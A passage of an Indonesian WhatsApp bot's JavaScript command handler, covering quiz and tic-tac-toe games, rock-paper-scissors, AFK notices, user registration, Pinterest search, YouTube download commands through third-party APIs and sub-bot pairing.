 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
conn.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
conn.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) conn.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
conn.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`🚫 *Jangan tag dia!*\n❏ *Dia sedang AFK* ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\n❏ *Selama* ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
*${pushname}* Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================// 
try {
switch(command) {
       /* case 'blacklist':
            if (!whooo) return m.reply('Tag/reply orangnya untuk Blacklist')

            try {
                if (Object.values(bl).find(v => v.id == whooo)) throw `Nomor ${whooo.split(`@`)[0]} sudah ada di *BlackList*`;

                bl.unshift({ id: whooo });
                db.data.chats[m.chat].blacklist = bl;
                await conn.sendMessage(m.chat, `Sukses menambahkan @${whooo.split(`@`)[0]} ke *BlackList*`, m, { contextInfo: { mentionedJid: [whooo] }});
            } catch (e) {
                throw e;
            }
            break;
        case 'unblacklist':
            if (!whooo) throw ('Tag/reply orangnya untuk Unblacklist')

            try {
                if (!Object.values(bl).find(v => v.id == whooo)) throw `Nomor ${whooo.split(`@`)[0]} tidak ada di *BlackList*`;

                bl.splice(bl.findIndex(v => v.id == whooo), 1);
                db.data.chats[m.chat].blacklist = bl;
                await conn.sendMessage(m.chat, `Sukses menghapus Nomor: @${whooo.split(`@`)[0]} dari *BlackList*`, m, { contextInfo: { mentionedJid: [whooo] }});
            } catch (e) {
                throw e;
            }
            break;
        case 'listblacklist':
        case 'listbl':
            let txt = `*「 Daftar Nomor Blacklist 」*\n\n*Total:* ${bl.length}\n\n┌─[ *BlackList* ]\n`;

            for (let i of bl) {
                txt += `├ @${i.id.split("@")[0]}\n`;
            }
            txt += "└─•";

            return conn.sendMessage(m.chat, txt, m, { contextInfo: { mentionedJid: bl.map(v => v.id) } }, {mentions: bl.map(v => v.id)});
            break;*/
        case 'daftar':case 'daftar':
    if (isRegistered) return reply('Kamu sudah terdaftar')
    if (!q.includes('.')) return reply(`Contoh: .${command} nama|umur`)
    
    const namaUser = q.substring(0, q.indexOf('.')).trim()
    const umurUser = q.substring(q.indexOf('.') + 1).trim()
    const serialUser = createSerial(20)
    
    if (isNaN(umurUser)) return m.reply('Umur harus berupa angka!')
    if (namaUser.length > 30) return m.reply('Nama terlalu panjang, maksimal 30 karakter')
    if (umurUser > 50) return m.reply('Di kasih umur muda malah minta cpt tua, mau cpt mati lu 😂?')
    if (umurUser < 12) return m.reply('lahir kapan luh?')
    
    let info = `Kamu telah terdaftar dengan informasi sebagai berikut:\n\n⭔ Nama : ${namaUser}\n⭔ Umur : ${umurUser}\n⭔ Nomor : wa.me/${m.sender.split("@")[0]}\n⭔ NS : ${serialUser}`
    
    if (!m.isGroup) {
        addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
        conn.sendMessage(m.chat, { image: add, caption: info }, { quoted: m })
    } else {
        addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
        conn.sendMessage(m.chat, { image: add, caption: info }, { quoted: m })
    }
    break
        /*case 'autochat': case 'autoai': 
        if (!isPrem) return reply(mess.premium)
let zyautochat = `${m.sender.split("@")[0]}`
if (args.length < 1) return m.reply(`*Contoh ${prefix + command} on/off*`)
                if (q == 'on'){
                if (data_autochat.includes(zyautochat)) return m.reply(`Kamu Masih Di Sesi Room Chat!`);
                    data_autochat.push(zyautochat);
                    saveDataChat();
                    m.reply(`berhasil membuka room chat. Kini orang lain tidak bisa mengganggu percakapanmu dengan A.I. Ketik *.${command} off* untuk menutup sesi room saat ini. *Ingat untuk menutup room sebelum kamu pergi!*`)
} else if (q == 'off'){
if (!data_autochat.includes(zyautochat)) return m.reply(`Kamu Tidak Sedang Berada Di Sesi Room Chat`);
const unp = data_autochat.indexOf(zyautochat);
                    data_autochat.splice(unp, 1);
                   saveDataChat();
                    m.reply(`Berhasil menutup room chat.`)
                }
break*/
case 'pin2': case 'pinterest2': {
  if (!text) return reply(`• *Example:* ${prefix + command} anime`);
  
  await m.reply(mess.wait);
  
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: conn.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }
  
  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);
  
  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;
  
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '', 
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source 🔍","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Hasil Dari: ' + text,
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {quoted:m});
  
  await conn.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}

break
case "help":
      
     m.reply(`Tulis .menu untuk menampilkan seluruh menu atau. listmenu untuk menampilkanya secara ringkas`)
        
break
/*case 'snack':
if (!q) return reply('where is the link')
reply(mess.search)
let ma = await fetch(`https://api.lolhuman.xyz/api/snackvideo?apikey=${apikeys}&url=${q}`)
conn.sendMessage(m.chat, {
video: {
url: ma.result.url
},
caption: ma.result.caption
}, {
quoted: m
})
break*/
case 'luxytmp3' : case 'yta' : case 'ytaudio': { 
       if(!q) return m.reply(`Example: .${command} linknya`)
       reply(mess.wait)
reply(mess.wait)
dylux.ytmp3(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.dl_url }, mimetype: 'audio/mp4' })
})
}
break
        case "jadibot":{
if (!isPrem) return reply(mess.premium)
  //if (m.isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isPrem) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(conn, m, from)
  await sleep(4000)
  //m.reply(`mess.wait`)
  const jsonData = JSON.parse(fs.readFileSync(`./session/${m.sender.split("@")[0]}/creds.json`));
// Membaca pairingCode dari file JSON
const pairingCode = jsonData.pairingCode;
// Membagi pairingCode menjadi kelompok-kelompok berisi empat karakter
let formattedPairingCode = '';
for (let i = 0; i < pairingCode.length; i += 4) {
  if (i > 0) {
    formattedPairingCode += '-';
  }
  formattedPairingCode += pairingCode.substring(i, i + 4);
}
// Mengirimkan Pesan
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> You Pairing Code : *${formattedPairingCode}*\n\n*How To Install*\n1. Enter the *linked device*\n2. Click *link device*\n3. Click enter *with phone number only*\n4. Enter your *code*"\n\nYour code will *expire* in *20* seconds`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ownername
          }),
          header: proto.Message.InteractiveMessage.Header.create({ 
                  title: ``,
                  gifPlayback: true,
                  subtitle: `test`,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_copy",
                "buttonParamsJson": JSON.stringify({
                "display_text": "Copy code",
                "copy_code": `${formattedPairingCode}`
                })
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterName: 'yayaay',
				  newsletterJid: '120363310531380313@newsletter',
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
        /*case "jadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(conn, m, from)
}
break*/
        case "stopjadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  stopjadibot(conn, from)
}
break
case "listjadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  listjadibot(conn, m)
}
break
        case 'play': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`contoh .play not you`)
  
  try {
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
    let teks = `⏩ *PLAYING AUDIO*\n\n*Judul :* ${result.title}\n*Upload At :* ${result.ago}\n*Url :* ${result.url}\n\n📦 *AUDIO SEDANG DIPROSES....*`
    
    await conn.sendMessage(m.chat, { image: { url: result.thumbnail},  caption: teks },{ quoted: m })
    
  let load = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${result.url}`)).json();
  let shannz = load.result
  
    await conn.sendMessage(m.chat, { audio: { url:shannz.download_url }, mimetype: 'audio/mp4', }, { quoted: m });
} catch (error) {
    m.reply('terjadi error' + error);
  }
}
break
        case 'ytmp33':{
if (!text) return m.reply(`input url`)
 if (global.db.data.users[m.sender].limit < 2) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 2
conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
let res = await ytmp3(text);
conn.sendMessage(m.chat, {
audio: {
url: res.mp3DownloadLink, 
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `youtube`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/fa89dc9d7e09256f8c69f.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} catch (err) {
console.error(err);
m.reply(`maaf saat ini sedang eror`)
}

async function ytmp3(videoUrl) {
return new Promise(async (resolve, reject) => {
try {
const searchParams = new URLSearchParams();
searchParams.append('query', videoUrl);
searchParams.append('vt', 'mp3');
const searchResponse = await axios.post(
'https://tomp3.cc/api/ajax/search',
searchParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (searchResponse.data.status !== 'ok') {
throw new Error('Failed to search for the video.');
}            
const videoId = searchResponse.data.vid;
const videoTitle = searchResponse.data.title;
const mp4Options = searchResponse.data.links.mp4;
const mp3Options = searchResponse.data.links.mp3;
const mediumQualityMp4Option = mp4Options[136]; 
const mp3Option = mp3Options['mp3128']; 
const mp4ConvertParams = new URLSearchParams();
mp4ConvertParams.append('vid', videoId);
mp4ConvertParams.append('k', mediumQualityMp4Option.k);
const mp4ConvertResponse = await axios.post(
'https://tomp3.cc/api/ajax/convert',
mp4ConvertParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (mp4ConvertResponse.data.status !== 'ok') {
throw new Error('Failed to convert the video to MP4.');
}
const mp4DownloadLink = mp4ConvertResponse.data.dlink;
const mp3ConvertParams = new URLSearchParams();
mp3ConvertParams.append('vid', videoId);
mp3ConvertParams.append('k', mp3Option.k);
const mp3ConvertResponse = await axios.post(
'https://tomp3.cc/api/ajax/convert',
mp3ConvertParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (mp3ConvertResponse.data.status !== 'ok') {
throw new Error('Failed to convert the video to MP3.');
}
const mp3DownloadLink = mp3ConvertResponse.data.dlink;
resolve({
title: videoTitle,
mp4DownloadLink,
mp3DownloadLink
});
} catch (error) {
reject('Error: ' + error.message);
}
});
}
};
        m.reply('_🚩 2 Limit Terpakai!!_')
break
        case 'ytmp3': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('mana linknya kak?')
try {
  m.reply('*Process sending audio, mungkin ini membutuhkan 1-3 menit jika durasi audio terlalu panjang!*')
  let procees = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${text}`)).json()
  let audio = procees.result;
conn.sendMessage(m.chat, {audio: {url: audio.download_url }, mimetype: 'audio/mp4' },{quoted: m})
} catch (e) {
    m.reply('*terjadi error :*' + e)
}
}
break
        case 'ytmp4': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('linknya?')
try {
  m.reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video terlalu panjang!*')
  let proces = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-video?url=${text}`)).json()
  let video4 = proces.result; conn.sendMessage(m.chat,{video:{url: video4.download_url }, caption: video4.title},{quoted: m})
} catch (e) {
    m.reply('*terjadi error :*' + e);
}
}
break
    case 'luxytmp4' : case 'ytv' : case 'ytvideo': { 
       if(!q) return m.reply(`Example: .${command} linknya`)
       reply(mess.wait)
dylux.ytmp4(q).then( data => {
conn.sendMessage(from, { video: { url: data.dl_url }, caption: data.title })
})
}
break
        case 'ytmp44':{
             if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3
if (!text) return m.reply(`input url`)
conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
let obj = await ytmp4(text);
let capt = `YOUTUBE VIDEO$\n\n`
capt += `┌  ◦ *NameBot* : ${global.botname}\n`
capt += `└  ◦ *Version* : 4.0.0\n\n`
capt += `${botname}`
conn.sendMessage(m.chat, { video: { url: obj.mp4DownloadLink }, mimetype: 'video/mp4', fileName: `youtube.mp4`, caption: capt })
} catch (err) {
console.error(err);
m.reply(`maaf saat ini fitur sedang eror!`);
}

async function ytmp4(videoUrl) {
return new Promise(async (resolve, reject) => {
try {
const searchParams = new URLSearchParams();
searchParams.append('query', videoUrl);
searchParams.append('vt', 'mp3');
const searchResponse = await axios.post(
'https://tomp3.cc/api/ajax/search',
searchParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (searchResponse.data.status !== 'ok') {
throw new Error('Failed to search for the video.');
}            
const videoId = searchResponse.data.vid;
const videoTitle = searchResponse.data.title;
const mp4Options = searchResponse.data.links.mp4;
const mp3Options = searchResponse.data.links.mp3;
const mediumQualityMp4Option = mp4Options[136]; 
const mp3Option = mp3Options['mp3128']; 
const mp4ConvertParams = new URLSearchParams();
mp4ConvertParams.append('vid', videoId);
mp4ConvertParams.append('k', mediumQualityMp4Option.k);
const mp4ConvertResponse = await axios.post(
'https://tomp3.cc/api/ajax/convert',
mp4ConvertParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (mp4ConvertResponse.data.status !== 'ok') {
throw new Error('Failed to convert the video to MP4.');
}
const mp4DownloadLink = mp4ConvertResponse.data.dlink;
const mp3ConvertParams = new URLSearchParams();
mp3ConvertParams.append('vid', videoId);
mp3ConvertParams.append('k', mp3Option.k);
const mp3ConvertResponse = await axios.post(
'https://tomp3.cc/api/ajax/convert',
mp3ConvertParams.toString(),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': '*/*',
'X-Requested-With': 'XMLHttpRequest'
}
}
);
if (mp3ConvertResponse.data.status !== 'ok') {
throw new Error('Failed to convert the video to MP3.');
}
const mp3DownloadLink = mp3ConvertResponse.data.dlink;
resolve({
title: videoTitle,
mp4DownloadLink,
mp3DownloadLink
});
} catch (error) {
reject('Error: ' + error.message);
}
});
}
};
        reply('_🚩 3 Limit Terpakai!!.._')
break

        case 'buylimit':{
if (isBan) return errorReply('Lu di ban kocak awokwok') 
if (!text) return errorReply(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = $5 balance`)
if (text.includes('-')) return errorReply(`Jangan menggunakan -`)
if (isNaN(text)) return errorReply(`Harus berupa angka`)
if (args[0] === 'infinity') return errorReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 5)
if (getMonay(m.sender, cekDuluJoinAdaApaKagaMonaynyaDiJson) < ane) return errorReply(`Money kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buylimit', m.sender, _cmd)
kurangMonay(m.sender, ane, balance)
addLimit(m.sender, parseInt(text), limit)
reply("Pembeliaan limit sebanyak " + text + " berhasil\n\nSisa Balance : $" + getBalance(m.sender, balance) + "\nSisa Limit : " + getLimit(m.sender, limitCount, limit) + '/' + limitCount)
}
break
case "listmenu": case "lmenu":
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     let capt = `
`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/faf4624376f51da2aef37.jpg' }, 
caption: `${infoo}\n${listmenu}`}, {quoted: m})
     /*conn.sendMessage(m.chat, {
video: fs.readFileSync('./database/base/media/Xero.mp4'),
caption: capt,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363310531380313@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnail: add,
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fkontak
})*/
       break
        /*case "meno":
        await loading()
        let ppek = `𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *Xero New Bot*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *Always Dich* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *Xero-V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Always Dich*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Public-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Private Panel*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${pushname}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *❌*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${hariini}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑.bugmenu
││✑.ownermenu
││✑.gamemenu
││✑.convertmenu
││✑.aimenu
││✑.infobot
││✑.jelajahmenu
││✑.suaramenu
││✑.islammenu
││✑.grupmenu
││✑.downloadmenu
││✑.randommenu
││✑.fotoname
││✑.panelmenu
││✑.scrapemenu
││✑.jebehmenu
││✑.txtmenu
││✑.asupanmenu
└─────────────────┈ ✈`
        conn.sendMessage(m.chat, {
text: ppek,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: '『 𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀𝙍𝙊 © 𝘽𝙔 𝘿𝙄𝘾𝙃 』',
body: '',
thumbnailUrl: 'https://telegra.ph/file/1c87b849d4de40ed58735.jpg',
sourceUrl: 'https://yandex.com',
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
        break*/
        case 'menu5':
         
                let exe = `👋 *Hai ${pushname}!* 🍃
Selamat datang di *${global.botname}*, bot WhatsApp yang siap membantu Anda

┌─ 📊 *DASHBOARD* ─┐
│
